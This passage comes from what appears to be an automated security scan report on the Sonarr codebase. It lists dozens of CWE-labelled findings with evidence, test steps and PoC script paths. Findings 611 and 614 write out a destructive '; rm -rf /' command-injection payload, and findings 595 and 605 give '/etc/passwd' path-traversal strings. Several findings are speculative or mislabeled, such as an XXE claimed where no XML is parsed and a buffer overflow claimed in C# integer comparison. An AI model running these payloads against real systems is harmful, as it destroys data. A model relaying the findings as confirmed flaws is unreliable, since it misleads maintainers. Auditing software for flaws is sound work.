**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneCore_Authentication_UserServicecs.py`
---

### 593. Deserialization of Untrusted Data (CWE-502)

**File:** src/NzbDrone.Core/Messaging/Commands/CommandExecutor.cs
**Line:** 43

**Description:**
The command execution system uses dynamic casting of command bodies which could be vulnerable to deserialization attacks if commands contain untrusted serialized data.

**Evidence:**
```
The ExecuteCommand method uses dynamic casting of command.Body, which could contain serialized objects that get deserialized without proper validation.
```

**Impact:**
Malicious command bodies with serialized data could lead to remote code execution or privilege escalation through deserialization vulnerabilities.

**Proof of Concept:**
Create a command with malicious serialized data in the command body and observe if it gets deserialized without proper validation.

**How to Test:**
1. Create commands with serialized malicious data
2. Monitor deserialization process
3. Test for RCE or privilege escalation opportunities

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-502_src_NzbDroneCore_Messaging_Commands_CommandExecutorcs.py`
---

### 594. Cross-site Scripting (XSS) (CWE-79)

**File:** src/NzbDrone.Core/Messaging/Events/EventAggregator.cs
**Line:** 100

**Description:**
The event aggregator may not properly sanitize event data that gets published to clients, potentially leading to XSS vulnerabilities.

**Evidence:**
```
The PublishEvent method handles event data that could contain user-controllable content, but there's no explicit sanitization before publishing to clients.
```

**Impact:**
User-controllable event data could be injected into client-side code, leading to XSS attacks in the web interface.

**Proof of Concept:**
Publish events with malicious content and observe if it gets reflected in the web interface without proper sanitization.

**How to Test:**
1. Publish events with XSS payloads
2. Monitor web interface for reflected XSS
3. Test event data sanitization

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneCore_Messaging_Events_EventAggregatorcs.py`
---

### 595. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Notifications/Webhook/WebhookProxy.cs
**Line:** 44

**Description:**
The WebhookProxy class accepts user-provided URL and headers without proper validation, potentially allowing command injection or path traversal through webhook configuration.

**Evidence:**
```
The SendWebhook method directly uses settings.Url and settings.Headers without validation, and the headers are added to requests without sanitization.
```

**Impact:**
Malicious webhook URLs or headers could lead to command injection, path traversal, or information disclosure when webhook payloads are processed.

**Proof of Concept:**
A webhook URL with path traversal sequences like '../../../../etc/passwd' or headers with command injection payloads could be executed when webhook requests are made.

**How to Test:**
1. Configure a webhook with malicious URL containing path traversal sequences
2. Configure webhook with headers containing command injection payloads
3. Trigger notification and observe if payloads are executed or if information is disclosed

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Notifications_Webhook_WebhookProxycs.py`
---

### 596. Insecure Data Storage (CWE-312)

**File:** src/NzbDrone.Core/Notifications/Twitter/TwitterSettings.cs
**Line:** 30

**Description:**
Twitter API credentials are stored in the database without proper encryption, potentially exposing sensitive authentication tokens.

**Evidence:**
```
The TwitterSettings class stores AccessToken and AccessTokenSecret fields that are persisted to the database without encryption.
```

**Impact:**
If the database is compromised, attackers could gain access to Twitter API tokens and potentially control the Sonarr Twitter notifications.

**Proof of Concept:**
Database dump containing Twitter API tokens would allow attackers to send tweets or direct messages using Sonarr's Twitter account.

**How to Test:**
1. Check database for Twitter settings storage
2. Verify if API tokens are stored in plain text
3. Attempt to extract database contents and verify token exposure

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_Notifications_Twitter_TwitterSettingscs.py`
---

### 597. Use of Hard-coded Credentials (CWE-798)

**File:** src/NzbDrone.Core/Notifications/Twitter/TwitterSettings.cs
**Line:** 20

**Description:**
Twitter API consumer keys and secrets are stored in configuration files or database without proper encryption or rotation mechanisms.

**Evidence:**
```
The TwitterSettings class stores ConsumerKey and ConsumerSecret fields that are used for OAuth authentication.
```

**Impact:**
Hard-coded API keys could be exposed through code repositories, backups, or database dumps, leading to unauthorized access to Twitter API resources.

**Proof of Concept:**
If Twitter consumer keys are hardcoded in configuration files, they could be extracted from source code repositories or database backups.

**How to Test:**
1. Review configuration files for hardcoded Twitter API keys
2. Check database for stored consumer keys
3. Verify if keys are properly rotated or encrypted

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-798_src_NzbDroneCore_Notifications_Twitter_TwitterSettingscs.py`
---

### 598. Improper Output Neutralization for Logs (CWE-117)

**File:** src/NzbDrone.Core/Notifications/NotificationService.cs
**Line:** 170

**Description:**
The notification service logs messages without proper log output neutralization, potentially leading to log injection attacks.

**Evidence:**
```
The service logs messages using _logger.Warn and _logger.Error without proper log message sanitization.
```

**Impact:**
An attacker could inject log injection sequences into notification messages that would be logged, potentially leading to log forging or command injection in log processing.

**Proof of Concept:**
A notification message containing log injection sequences like 'INFO: User input: %n%t%r' could be used to manipulate log file structure.

**How to Test:**
1. Send notification with log injection sequences
2. Check log files for injection effects
3. Verify if log processing is affected by injection sequences

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-117_src_NzbDroneCore_Notifications_NotificationServicecs.py`
---

### 599. Improper Control of Generation of Code ('Code Injection') (CWE-94)

**File:** src/NzbDrone.Core/Notifications/Webhook/WebhookProxy.cs
**Line:** 37

**Description:**
The WebhookProxy class constructs HTTP requests with user-provided data that could lead to code injection in webhook processing.

**Evidence:**
```
The SendWebhook method constructs HTTP requests using user-provided URL and headers without proper sanitization.
```

**Impact:**
Malicious webhook configurations could lead to code injection in webhook processing or result in unexpected behavior when webhook payloads are processed.

**Proof of Concept:**
A webhook URL with specially crafted parameters or headers could cause unexpected behavior in webhook processing or injection in payload handling.

**How to Test:**
1. Configure webhook with malicious URL parameters
2. Configure webhook with headers that could cause injection
3. Trigger notification and observe webhook behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-94_src_NzbDroneCore_Notifications_Webhook_WebhookProxycs.py`
---

### 600. Cross-Site Request Forgery (CSRF) (CWE-352)

**File:** src/NzbDrone.Core/Notifications/Twitter/Twitter.cs
**Line:** 120

**Description:**
The Twitter notification class handles OAuth authentication without proper CSRF protection, potentially allowing unauthorized OAuth token updates.

**Evidence:**
```
The RequestAction method handles OAuth token updates without CSRF token validation.
```

**Impact:**
An attacker could perform unauthorized OAuth token updates for Twitter notifications, potentially gaining control over notification settings.

**Proof of Concept:**
An attacker could craft a malicious request to update Twitter OAuth tokens without proper authentication, changing notification configuration.

**How to Test:**
1. Test Twitter OAuth token update endpoints without CSRF tokens
2. Verify if unauthorized updates are accepted
3. Check if token updates require proper authentication

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneCore_Notifications_Twitter_Twittercs.py`
---

### 601. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Notifications/Discord/Discord.cs
**Line:** 100

**Description:**
The Discord notification system does not validate the length or content of user-provided data before including it in Discord embed fields, potentially leading to field truncation or malformed payloads.

**Evidence:**
```
The code uses string truncation (e.g., overview.Length <= 300 ? overview : overview.AsSpan(0, 300).ToString() + "..") but doesn't validate the maximum length of other fields like 'Title' or 'Description' which could cause issues with Discord's API limits.
```

**Impact:**
If user-provided data exceeds Discord's field limits, it could cause notification failures or malformed messages. The truncation logic may not be comprehensive enough for all fields.

**Proof of Concept:**
If a user provides a title longer than 256 characters, it may not be properly truncated, potentially causing Discord API errors or malformed notifications.

**How to Test:**
1. Configure Discord notifications with custom fields
2. Create a release with extremely long field values (e.g., 1000+ character overview)
3. Trigger notification and observe if it fails or gets truncated incorrectly

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Notifications_Discord_Discordcs.py`
---

### 602. XML External Entity (XXE) Injection (CWE-91)

**File:** src/NzbDrone.Core/Notifications/Discord/Discord.cs
**Line:** 100

**Description:**
While not directly processing XML, the Discord notification system could be vulnerable to XXE injection if it processes external data sources that include XML content, particularly in the media URL handling.

**Evidence:**
```
The code fetches images from remote URLs (e.g., series.Images.FirstOrDefault(x => x.CoverType == MediaCoverTypes.Poster)?.RemoteUrl) which could be manipulated to point to malicious XML resources.
```

**Impact:**
If the Discord notification system processes external XML data or if the remote image URLs are not properly validated, an attacker could potentially trigger XXE attacks through image loading or other external resource handling.

**Proof of Concept:**
An attacker could configure a series with an image URL pointing to a malicious XML resource that could be processed by the Discord webhook system or other components.

**How to Test:**
1. Configure a Discord notification with poster/fanart fields
2. Set up a malicious image URL that could trigger XXE
3. Trigger notification and observe if external resources are properly validated

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-91_src_NzbDroneCore_Notifications_Discord_Discordcs.py`
---

### 603. Cross-Site Request Forgery (CWE-352)

**File:** src/NzbDrone.Core/Notifications/Discord/Discord.cs
**Line:** 100

**Description:**
The Discord notification system doesn't implement CSRF protection for its configuration endpoints, potentially allowing unauthorized configuration changes.

**Evidence:**
```
The DiscordSettings class and related configuration handling doesn't include CSRF tokens in its configuration forms or API endpoints, making it vulnerable to CSRF attacks.
```

**Impact:**
An attacker could trick a user into changing Discord notification settings, potentially redirecting notifications to malicious webhooks or changing notification behavior.

**Proof of Concept:**
An attacker could create a malicious webpage that submits a form to change Discord webhook settings when a user visits the page, without the user's knowledge.

**How to Test:**
1. Access Sonarr's Discord notification configuration page
2. Check if CSRF tokens are present in forms
3. Try submitting a configuration change without proper authentication
4. Observe if configuration changes are accepted without CSRF validation

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneCore_Notifications_Discord_Discordcs.py`
---

### 604. Improper Neutralization of Special Elements in Output Used by a Downstream Component (CWE-74)

**File:** src/NzbDrone.Core/Notifications/Discord/Discord.cs
**Line:** 100

**Description:**
The Discord notification system doesn't properly neutralize special characters in fields that are directly used in Discord's markdown formatting, potentially leading to unexpected behavior or injection.

**Evidence:**
```
The code uses Discord's markdown formatting (e.g., string.Format("```{0}```", message.Episode.Release.Title)) but doesn't escape special markdown characters in the content, which could break the formatting.
```

**Impact:**
Special characters in notification content could break Discord's markdown formatting, leading to malformed notifications or unexpected rendering behavior.

**Proof of Concept:**
If a release title contains backticks (e.g., "`test`"), it could break Discord's code block formatting and potentially allow injection of additional markdown elements.

**How to Test:**
1. Create a release with special markdown characters in title or description
2. Trigger Discord notification
3. Observe if markdown formatting is broken or if characters are interpreted as markdown elements

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-74_src_NzbDroneCore_Notifications_Discord_Discordcs.py`
---

### 605. Path Traversal (CWE-22)

**File:** src/NzbDrone.Core/Notifications/Discord/Discord.cs
**Line:** 100

**Description:**
The Discord notification system could be vulnerable to path traversal when handling image URLs, particularly if external URLs are not properly validated.

**Evidence:**
```
The code fetches image URLs from external sources (series.Images.FirstOrDefault(x => x.CoverType == MediaCoverTypes.Poster)?.RemoteUrl) without validating the URL structure or preventing path traversal in the URL components.
```

**Impact:**
If external image URLs are not properly validated, an attacker could potentially manipulate image URLs to point to unexpected resources or trigger path traversal in the image loading process.

**Proof of Concept:**
An attacker could configure a series with an image URL that includes path traversal sequences (e.g., "http://example.com/images/../../../etc/passwd") which could be processed incorrectly.

**How to Test:**
1. Configure a Discord notification with image fields
2. Set image URLs with path traversal sequences
3. Trigger notification and observe if URLs are properly validated

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_Notifications_Discord_Discordcs.py`
---

### 606. Improper Output Neutralization for Logs (CWE-117)

**File:** src/NzbDrone.Core/Notifications/Discord/Discord.cs
**Line:** 100

**Description:**
The Discord notification system doesn't properly neutralize special characters in log messages or error reporting, potentially leading to log injection or parsing issues.

**Evidence:**
```
The code uses various string formatting and concatenation operations that could include special characters that affect log parsing or injection.
```

**Impact:**
Special characters in notification data could cause log parsing issues or allow log injection attacks, potentially affecting audit trails or security monitoring.

**Proof of Concept:**
If notification data contains log injection characters (e.g., newlines, special control characters), it could affect log parsing or allow injection of additional log entries.

**How to Test:**
1. Configure Discord notifications with special characters in data fields
2. Trigger notifications and check log output
3. Observe if special characters affect log parsing or injection

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-117_src_NzbDroneCore_Notifications_Discord_Discordcs.py`
---

### 607. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Notifications/Ntfy/NtfySettings.cs
**Line:** 40

**Description:**
The Topics validation allows topics that could be vulnerable to injection or conflict with system topics.

**Evidence:**
```
InvalidTopics list contains system topics like 'announcements', 'app', 'docs', etc. that are excluded from user configuration, but there's no validation to prevent users from creating topics that might conflict.
```

**Impact:**
While not directly exploitable, poorly validated topics could lead to unexpected behavior or conflicts with system topics.

**Proof of Concept:**
A user could potentially create a topic named 'app' or 'docs' that might conflict with system functionality, though this is more of a usability issue than a security vulnerability.

**How to Test:**
1. Configure Ntfy notification with a topic named 'app'
2. Verify if the system handles conflicts properly
3. Check if system topics are properly protected from user configuration

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Notifications_Ntfy_NtfySettingscs.py`
---

### 608. Missing Encryption of Sensitive Data (CWE-311)

**File:** src/NzbDrone.Core/Notifications/Trakt/TraktProxy.cs
**Line:** 18

**Description:**
The Trakt ClientId is stored in cleartext in the source code, which could be exposed in various scenarios.

**Evidence:**
```
The ClientId is hardcoded as a constant string in the source code file
```

**Impact:**
If the source code is exposed or if the application is deployed in an environment where source code is accessible, the client ID can be easily extracted.

**Proof of Concept:**
An attacker who gains access to the source code repository or binary can extract the Trakt ClientId, which could be used to make unauthorized API calls to Trakt.

**How to Test:**
1. Examine source code for hardcoded credentials
2. Check if client ID is stored in configuration files
3. Verify if credentials are properly encrypted or stored in environment variables

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-311_src_NzbDroneCore_Notifications_Trakt_TraktProxycs.py`
---

### 609. Improper Authentication (CWE-287)

**File:** src/NzbDrone.Core/Notifications/Trakt/TraktProxy.cs
**Line:** 34

**Description:**
The Trakt OAuth flow uses a hardcoded redirect URI, which could be vulnerable to authorization code injection attacks.

**Evidence:**
```
RedirectUri is hardcoded as 'https://auth.servarr.com/v1/trakt_sonarr/auth'
```

**Impact:**
If the redirect URI is not properly validated, attackers might be able to inject authorization codes or manipulate the OAuth flow.

**Proof of Concept:**
If an attacker can control the OAuth flow or manipulate the redirect URI, they might be able to obtain access tokens for Trakt accounts.

**How to Test:**
1. Test OAuth flow with different redirect URIs
2. Verify that redirect URI validation is properly implemented
3. Check if the hardcoded redirect URI can be bypassed

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_NzbDroneCore_Notifications_Trakt_TraktProxycs.py`
---

### 610. Improper Output Neutralization for Logs (CWE-117)

**File:** src/NzbDrone.Core/Notifications/MediaBrowser/MediaBrowserProxy.cs
**Line:** 52

**Description:**
The MediaBrowser proxy logs HTTP responses without proper sanitization, potentially leading to log injection attacks.

**Evidence:**
```
Response content is logged directly: _logger.Trace("Response: {0}", response.Content);
```

**Impact:**
If response content contains special characters or control sequences, attackers might be able to inject log entries or manipulate log parsing.

**Proof of Concept:**
If a MediaBrowser response contains control characters or log injection sequences, these could be logged and potentially exploited by log analysis tools.

**How to Test:**
1. Configure MediaBrowser notification
2. Trigger a notification with response content containing special characters
3. Check log output for potential injection vulnerabilities
4. Verify log sanitization is applied to response content

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-117_src_NzbDroneCore_Notifications_MediaBrowser_MediaBrowserProxycs.py`
---

### 611. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Notifications/CustomScript/CustomScript.cs
**Line:** 300

**Description:**
Custom script execution does not properly neutralize special elements in environment variables, potentially leading to command injection.

**Evidence:**
```
Environment variables are set directly without sanitization: environmentVariables.Add("Sonarr_Series_Title", series.Title);
```

**Impact:**
If the custom script is not properly secured, specially crafted series titles or other data could lead to command injection.

**Proof of Concept:**
A series title containing shell metacharacters like '; rm -rf /' could cause the script to execute unintended commands if not properly escaped.

**How to Test:**
1. Configure a custom script notification
2. Create a series with special shell characters in title
3. Trigger notification and observe script execution
4. Verify proper escaping of environment variables

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Notifications_CustomScript_CustomScriptcs.py`
---

### 612. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Notifications/Telegram/TelegramSettings.cs
**Line:** 35

**Description:**
The Telegram settings validation doesn't properly validate the LinkPreview field against the selected MetadataLinks, allowing invalid combinations.

**Evidence:**
```
The validation checks if the LinkPreview value is defined but doesn't ensure it's one of the selected metadata links.
```

**Impact:**
Could lead to configuration inconsistencies where a preview is set to a link type that wasn't selected for metadata links.

**Proof of Concept:**
Configure Telegram settings with MetadataLinks = [0, 2] (IMDb and TVMaze) but set LinkPreview = 3 (Trakt). The validation passes but Trakt preview will not work correctly.

**How to Test:**
1. Set up Telegram notification with specific metadata links
2. Set LinkPreview to a value not in the selected metadata links
3. Verify validation passes but preview functionality is broken

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Notifications_Telegram_TelegramSettingscs.py`
---

### 613. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core/Notifications/Plex/Server/PlexServerSettings.cs
**Line:** 45

**Description:**
The Plex authentication token is stored in cleartext in the configuration, which could be exposed through various means.

**Evidence:**
```
The AuthToken field is marked with Privacy = PrivacyLevel.ApiKey but is stored in plain text in the configuration file.
```

**Impact:**
If the configuration file is compromised, attackers can access the Plex authentication token and potentially gain access to the user's Plex account and media server.

**Proof of Concept:**
An attacker with access to the Sonarr configuration file can extract the Plex AuthToken and use it to access the user's Plex account.

**How to Test:**
1. Check the configuration file for stored Plex AuthToken
2. Verify that the token is stored in plain text
3. Attempt to use the token with Plex API directly

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_Notifications_Plex_Server_PlexServerSettingscs.py`
---

### 614. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/Notifications/Plex/Server/PlexServerProxy.cs
**Line:** 100

**Description:**
The Plex server proxy constructs URLs using user-provided host information without proper sanitization, potentially leading to command injection.

**Evidence:**
```
The Host field is used directly in URL construction without validation or sanitization.
```

**Impact:**
If an attacker can control the Plex server host configuration, they could inject commands through specially crafted host names.

**Proof of Concept:**
Configure a Plex server with a host like '127.0.0.1; rm -rf /' and verify if the command injection occurs during server operations.

**How to Test:**
1. Configure a Plex server with a malicious host name
2. Trigger a Plex operation
3. Monitor for command execution or unexpected behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Notifications_Plex_Server_PlexServerProxycs.py`
---

### 615. Cross-Site Request Forgery (CWE-352)

**File:** src/NzbDrone.Core/Notifications/Plex/Server/PlexServer.cs
**Line:** 110

**Description:**
The Plex OAuth request action endpoints lack CSRF protection, making them vulnerable to CSRF attacks.

**Evidence:**
```
The OAuth endpoints (startOAuth, continueOAuth, pollOAuth, getOAuthToken) don't implement CSRF token validation.
```

**Impact:**
An attacker could trick a user into performing unauthorized OAuth operations on their behalf, potentially gaining access to their Plex account.

**Proof of Concept:**
Create a malicious page that triggers OAuth requests to a victim's Sonarr instance without their knowledge.

**How to Test:**
1. Access the Plex OAuth endpoints without proper CSRF tokens
2. Verify if requests are accepted without validation
3. Attempt to forge OAuth requests

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneCore_Notifications_Plex_Server_PlexServercs.py`
---

### 616. Improper Output Neutralization for Logs (CWE-117)

**File:** src/NzbDrone.Core/Notifications/Plex/Server/PlexServerProxy.cs
**Line:** 120

**Description:**
The Plex server proxy logs user-provided data without proper neutralization, potentially leading to log injection attacks.

**Evidence:**
```
The proxy logs user-provided data directly in log messages without sanitization.
```

**Impact:**
An attacker could inject malicious content into logs that could be used for log-based attacks or information disclosure.

**Proof of Concept:**
Configure a Plex server with a host containing special characters and verify if they appear in logs without proper escaping.

**How to Test:**
1. Configure a Plex server with special characters in host name
2. Trigger a Plex operation
3. Check logs for proper escaping of special characters

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-117_src_NzbDroneCore_Notifications_Plex_Server_PlexServerProxycs.py`
---

### 617. Path Traversal (CWE-22)

**File:** src/NzbDrone.Core/Notifications/Plex/Server/PlexServerService.cs
**Line:** 110

**Description:**
The Plex server service uses user-provided paths without proper validation, potentially allowing path traversal attacks.

**Evidence:**
```
The service constructs paths using user-provided relative paths without validating against allowed directories.
```

**Impact:**
An attacker could manipulate paths to access files outside of the intended directories, potentially leading to information disclosure or file system manipulation.

**Proof of Concept:**
Configure a Plex server with a path that includes '../' sequences and verify if they can traverse to parent directories.

**How to Test:**
1. Configure a Plex server with path traversal sequences
2. Trigger a Plex operation
3. Verify if path traversal occurs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_Notifications_Plex_Server_PlexServerServicecs.py`
---

### 618. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Notifications/Plex/Server/PlexServerService.cs
**Line:** 110

**Description:**
The Plex server service constructs paths using user-provided data without proper command injection prevention.

**Evidence:**
```
The service constructs paths using user-provided relative paths without validating or escaping special characters.
```

**Impact:**
An attacker could inject special characters that might be interpreted as commands or path separators.

**Proof of Concept:**
Configure a Plex server with a path containing special characters and verify if they are properly handled.

**How to Test:**
1. Configure a Plex server with special characters in paths
2. Trigger a Plex operation
3. Verify if special characters are properly escaped or validated

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Notifications_Plex_Server_PlexServerServicecs.py`
---

### 619. Cross-site Scripting (CWE-79)

**File:** src/NzbDrone.Core/Notifications/Slack/Slack.cs
**Line:** 200

**Description:**
The Slack notification system does not properly sanitize user input when creating Slack payloads, potentially allowing XSS attacks through message content.

**Evidence:**
```
The CreatePayload method in Slack.cs directly uses user-provided message content without sanitization, and the payload is sent to Slack webhook without proper escaping.
```

**Impact:**
An attacker could craft malicious messages that, when processed by Slack, could execute JavaScript in the Slack client, potentially stealing session tokens or performing actions on behalf of users.

**Proof of Concept:**
If a user can control the message content sent to Sonarr (e.g., through a custom notification or via API), they could inject HTML/JavaScript into the Slack message payload that would execute when users view the notification in Slack.

**How to Test:**
1. Configure a Slack notification in Sonarr
2. Trigger a notification with malicious payload containing HTML/JavaScript
3. Observe if the JavaScript executes in Slack client when viewing the notification

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneCore_Notifications_Slack_Slackcs.py`
---

### 620. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Notifications/Gotify/GotifySettings.cs
**Line:** 25

**Description:**
The MetadataLinks validation in GotifySettings does not properly validate the range of integer values, potentially allowing out-of-bounds values.

**Evidence:**
```
The validation checks if a link is defined in MetadataLinkType enum but doesn't validate that the integer values are within expected bounds or that they represent valid metadata link types.
```

**Impact:**
Invalid metadata link values could cause runtime exceptions or unexpected behavior when processing notifications.

**Proof of Concept:**
An attacker could submit a GotifySettings configuration with MetadataLinks containing integer values that are outside the valid range of MetadataLinkType enum values, potentially causing exceptions during notification processing.

**How to Test:**
1. Create a GotifySettings object with MetadataLinks containing invalid integer values
2. Call the validation logic
3. Observe if validation properly rejects invalid values or if they cause runtime issues

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Notifications_Gotify_GotifySettingscs.py`
---

### 621. Sensitive Data in Memory (CWE-312)

**File:** src/NzbDrone.Core/Notifications/Mailgun/MailgunProxy.cs
**Line:** 35

**Description:**
Mailgun API key is stored in memory during request processing and may be exposed through memory dumps or logging.

**Evidence:**
```
The MailgunProxy class stores API key in NetworkCredential object but doesn't explicitly clear sensitive data from memory after use.
```

**Impact:**
If the application crashes or is memory dumped, API keys could be extracted from memory, allowing unauthorized access to Mailgun services.

**Proof of Concept:**
If Sonarr crashes or is memory dumped during Mailgun API calls, the API key could be found in the memory dump, allowing an attacker to make unauthorized Mailgun API calls.

**How to Test:**
1. Configure Mailgun notification with API key
2. Trigger a notification
3. Check if API key appears in memory dumps or logs
4. Monitor for sensitive data exposure during process lifetime

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_Notifications_Mailgun_MailgunProxycs.py`
---

### 622. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/Notifications/Xbmc/XbmcJsonApiProxy.cs
**Line:** 100

**Description:**
The XBMC/Kodi integration may be vulnerable to command injection through improperly escaped parameters in JSON-RPC requests.

**Evidence:**
```
The ProcessRequest method in XbmcJsonApiProxy builds JSON-RPC requests with parameters but doesn't validate or escape special characters in parameter values.
```

**Impact:**
An attacker could inject malicious commands through specially crafted parameters in XBMC/Kodi API calls, potentially allowing remote code execution on the Kodi host.

**Proof of Concept:**
If an attacker can control parameters passed to XBMC/Kodi API calls (e.g., through notification content or configuration), they could inject special characters that allow command injection in the Kodi environment.

**How to Test:**
1. Configure XBMC/Kodi notification
2. Send notification with specially crafted parameters
3. Monitor XBMC/Kodi logs for command execution
4. Test with parameters containing shell metacharacters

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Notifications_Xbmc_XbmcJsonApiProxycs.py`
---

### 623. Improper Authentication (CWE-287)

**File:** src/NzbDrone.Core/Notifications/Signal/SignalProxy.cs
**Line:** 35

**Description:**
Signal notification authentication credentials are not properly secured or validated, potentially allowing unauthorized access.

**Evidence:**
```
The SignalProxy class accepts authentication credentials but doesn't validate their strength or properly secure them during transmission.
```

**Impact:**
Weak or improperly handled authentication credentials could allow unauthorized access to Signal service endpoints, potentially enabling message interception or sending.

**Proof of Concept:**
An attacker could potentially use weak authentication credentials to send messages through the Signal service or intercept messages sent by Sonarr.

**How to Test:**
1. Configure Signal notification with weak authentication
2. Attempt to send test messages
3. Monitor for authentication failures or unauthorized access attempts
4. Test with various credential combinations

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_NzbDroneCore_Notifications_Signal_SignalProxycs.py`
---

### 624. Missing Encryption of Sensitive Data (CWE-311)

**File:** src/NzbDrone.Core/Notifications/Email/Email.cs
**Line:** 100

**Description:**
Email notification settings may not properly encrypt sensitive data during transmission or storage.

**Evidence:**
```
The Email class handles email credentials but doesn't explicitly validate or encrypt sensitive data beyond basic credential handling.
```

**Impact:**
Email credentials could be exposed in logs or transmitted without proper encryption, allowing unauthorized access to email services.

**Proof of Concept:**
If email credentials are logged or transmitted without proper encryption, an attacker could capture these credentials and use them to send emails or access email accounts.

**How to Test:**
1. Configure email notification with credentials
2. Check logs for credential exposure
3. Monitor network traffic for unencrypted credential transmission
4. Test with various encryption settings

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-311_src_NzbDroneCore_Notifications_Email_Emailcs.py`
---

### 625. Information Exposure (CWE-200)

**File:** src/NzbDrone.Core/Notifications/Slack/SlackProxy.cs
**Line:** 30

**Description:**
Slack notification payload information may be exposed through logging or error handling mechanisms.

**Evidence:**
```
The SlackProxy logs payload information during error handling but doesn't properly sanitize sensitive data in logs.
```

**Impact:**
Sensitive information from Slack payloads could be exposed in application logs, potentially revealing internal system details or user data.

**Proof of Concept:**
If a Slack notification fails, the error logging may include sensitive payload data in logs, exposing internal system information or user data.

**How to Test:**
1. Configure Slack notification
2. Trigger a notification that fails
3. Check application logs for payload information exposure
4. Verify sensitive data is properly sanitized in logs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-200_src_NzbDroneCore_Notifications_Slack_SlackProxycs.py`
---

### 626. Stack-based Buffer Overflow (CWE-121)

**File:** src/NzbDrone.Core/Notifications/Xbmc/Model/XbmcVersion.cs
**Line:** 100

**Description:**
The XbmcVersion class comparison methods may be vulnerable to stack-based buffer overflows due to integer comparisons.

**Evidence:**
```
The CompareTo method in XbmcVersion uses integer comparisons that could potentially overflow or cause unexpected behavior with large version numbers.
```

**Impact:**
Large version numbers or specially crafted version comparisons could cause unexpected behavior or potential buffer overflow conditions.

**Proof of Concept:**
If XbmcVersion objects are created with very large integer values, the comparison logic could potentially overflow or behave unexpectedly, leading to incorrect version comparisons.

**How to Test:**
1. Create XbmcVersion objects with very large integer values
2. Compare these versions
3. Observe if comparison logic handles large values correctly
4. Test edge cases with maximum integer values

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_NzbDroneCore_Notifications_Xbmc_Model_XbmcVersioncs.py`
---

### 627. Cross-Site Request Forgery (CWE-352)

